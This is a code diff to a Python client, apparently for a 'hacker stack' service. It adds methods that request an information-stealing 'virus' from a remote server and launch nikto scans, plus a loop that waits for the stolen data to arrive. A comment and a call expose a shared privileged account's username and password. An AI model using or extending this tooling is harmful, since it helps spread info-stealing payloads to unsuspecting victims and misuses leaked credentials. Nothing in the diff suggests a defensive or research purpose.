@@ -128,7 +128,7 @@ class OpenHackerStackAPI:
         data = {
             "command": "none"
         }
-        response = requests.post(url,data=data)
+        response = requests.post(url,data=json.dumps(data))
         return response.text
     
     def GoogleProxy(self , link: str) -> str:
@@ -150,6 +150,29 @@ class OpenHackerStackAPI:
         '''
         return requests.get(f"{api_server}/get_virus/{virus_name}").content
 
+    def create_get_info_virus(self) -> str:
+        '''
+        创建一个被动式信息获取的病毒，返回病毒的Token，可以访问 https://api.hackerstack.top/获取的token
+        可以通过 get_message() 来事实查看收到的信息，但是呢，如果是none说明没有收到信息
+        '''
+        url = f"{api_server}/api/VirusInfoGetter/{self.username}/{self.password}"
+        r = requests.get(url)
+        return r.text # 返回的token
+    
+    def nikto_scan(self, target: str) -> str:
+        '''
+        target输入的内容大概就是类似于: https://edu.hackerstack.top/
+        '''
+        return requests.get(f"{api_server}/bug_search/{self.apiKey}/{target}").text
+
 # 用户名 linux 密码 linux 是特权账号，有的教育版设置续费到了2099年的
 api = OpenHackerStackAPI("linux", "linux")
-print(api.website_dir_scan("https://edu.hackerstack.top/"))
+token = api.create_get_info_virus()
+print("https://api.hackerstack.top/" + token)
+while True:
+    message = api.get_message(token)
+    if message == "none":
+        pass
+    else:
+        print(message)
+        break
